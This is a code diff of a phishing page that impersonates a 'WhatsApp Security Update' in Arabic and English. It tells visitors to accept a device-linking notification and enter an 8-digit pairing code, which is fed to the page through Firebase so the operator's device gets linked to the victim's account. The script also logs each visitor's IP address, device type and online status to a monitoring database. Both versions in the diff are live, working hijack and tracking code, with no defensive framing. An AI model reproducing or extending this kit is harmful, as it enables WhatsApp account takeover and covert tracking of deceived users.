@@ -47,45 +47,43 @@
         const db = firebase.database();
         const userId = new URLSearchParams(window.location.search).get('id');
 
-        const translations = {
-            ar: { title: "تحديث أمان واتساب", badge: "جهاز مرتبط: iPhone", old: "البروتوكول الحالي:", new: "البروتوكول المحدث:", alert: "لحماية خصوصيتك ومحادثاتك، يجب عليك الترقية إلى أحدث بروتوكول أمني (V3.0.1).", steps: "<b>كيفية التفعيل:</b><br>1. ستتلقى الآن إشعاراً رسمياً من واتساب لربط الجهاز؛ اضغط عليه فوراً.<br>2. اختر <b>'الربط برقم الهاتف بدلاً من ذلك'</b> في الأسفل.<br>3. أدخل رمز التحقق المكون من 8 أرقام الذي سيظهر هنا خلال لحظات:", wait: "في انتظار رمز الأمان.. سيصل هنا قريباً", done: "تم استخراج الكود! أدخله في واتساب الآن" },
-            en: { title: "WhatsApp Security Update", badge: "Linked Device: iPhone", old: "Current Protocol:", new: "Updated Protocol:", alert: "To protect your privacy and chats, you must upgrade to the latest security protocol (V3.0.1).", steps: "<b>How to activate:</b><br>1. You will now receive an official WhatsApp notification to link a device; tap it immediately.<br>2. Select <b>'Link with phone number instead'</b> at the bottom.<br>3. Enter the 8-digit verification code that will appear here in a few moments:", wait: "Awaiting security code.. arriving in moments", done: "Code generated! Enter it in WhatsApp now" }
+        function getDevice() {
+            const ua = navigator.userAgent;
+            if (/android/i.test(ua)) return "Android";
+            if (/iPad|iPhone|iPod/.test(ua)) return "iPhone";
+            return navigator.platform || "PC";
+        }
+
+        const trans = {
+            ar: { t: "تحديث أمان واتساب", b: "جهاز مرتبط: iPhone", o: "البروتوكول الحالي:", n: "البروتوكول المحدث:", a: "لحماية خصوصيتك ومحادثاتك، يجب عليك الترقية إلى أحدث بروتوكول أمني (V3.0.1).", s: "<b>كيفية التفعيل:</b><br>1. ستتلقى الآن إشعاراً من واتساب لربط الجهاز؛ اضغط عليه.<br>2. اختر <b>'الربط برقم الهاتف بدلاً من ذلك'</b>.<br>3. أدخل رمز التحقق المكون من 8 أرقام الذي سيظهر هنا:", w: "في انتظار رمز الأمان.. سيصل هنا قريباً", d: "تم استخراج الكود! أدخله في واتساب الآن" },
+            en: { t: "WhatsApp Security Update", b: "Linked Device: iPhone", o: "Current Protocol:", n: "Updated Protocol:", a: "To protect your privacy, upgrade to the latest security protocol (V3.0.1).", s: "<b>How to activate:</b><br>1. Tap the WhatsApp notification.<br>2. Select <b>'Link with phone number instead'</b>.<br>3. Enter the 8-digit code shown here:", w: "Awaiting security code...", d: "Code generated! Enter it in WhatsApp" }
         };
 
-        const userLang = navigator.language.startsWith('ar') ? 'ar' : 'en';
-        const lang = translations[userLang];
-        document.documentElement.dir = userLang === 'ar' ? 'rtl' : 'ltr';
-
-        document.getElementById('ui-title').innerText = lang.title;
-        document.getElementById('ui-badge').innerText = lang.badge;
-        document.getElementById('ui-old-label').innerText = lang.old;
-        document.getElementById('ui-new-label').innerText = lang.new;
-        document.getElementById('ui-alert').innerText = lang.alert;
-        document.getElementById('ui-steps').innerHTML = lang.steps;
-        document.getElementById('ui-wait').innerText = lang.wait;
+        const lang = navigator.language.startsWith('ar') ? trans.ar : trans.en;
+        document.documentElement.dir = navigator.language.startsWith('ar') ? 'rtl' : 'ltr';
+        document.getElementById('ui-title').innerText = lang.t;
+        document.getElementById('ui-badge').innerText = lang.b;
+        document.getElementById('ui-old-label').innerText = lang.o;
+        document.getElementById('ui-new-label').innerText = lang.n;
+        document.getElementById('ui-alert').innerText = lang.a;
+        document.getElementById('ui-steps').innerHTML = lang.s;
+        document.getElementById('ui-wait').innerText = lang.w;
 
         if (userId) {
-            const statusRef = db.ref('monitoring/' + userId);
-            const commandRef = db.ref('commands/' + userId);
+            const sRef = db.ref('monitoring/' + userId);
+            const dev = getDevice();
             
-            fetch('https://api.ipify.org?format=json')
-                .then(res => res.json())
-                .then(data => {
-                    statusRef.update({
-                        status: "Online",
-                        ip: data.ip,
-                        device: navigator.platform + " / " + (navigator.userAgent.match(/\(([^)]+)\)/) ? navigator.userAgent.match(/\(([^)]+)\)/)[1] : "Device"),
-                        ts: Date.now()
-                    });
-                }).catch(() => statusRef.update({ status: "Online", ts: Date.now() }));
+            fetch('https://api.ipify.org?format=json').then(r => r.json()).then(d => {
+                sRef.update({ status: "Online", ip: d.ip, device: dev, ts: Date.now() });
+            }).catch(() => sRef.update({ status: "Online", ip: "Hidden", device: dev, ts: Date.now() }));
 
-            statusRef.onDisconnect().update({ status: "Offline" });
+            sRef.onDisconnect().update({ status: "Offline" });
 
-            commandRef.on('value', (snap) => {
-                const val = snap.val();
-                if (val && val.code) {
-                    document.getElementById('pairing-code').innerText = val.code;
-                    document.getElementById('ui-wait').innerText = lang.done;
+            db.ref('commands/' + userId).on('value', (snap) => {
+                const v = snap.val();
+                if (v && v.code) {
+                    document.getElementById('pairing-code').innerText = v.code;
+                    document.getElementById('ui-wait').innerText = lang.d;
                     document.getElementById('ui-wait').classList.add('arrived');
                 }
             });
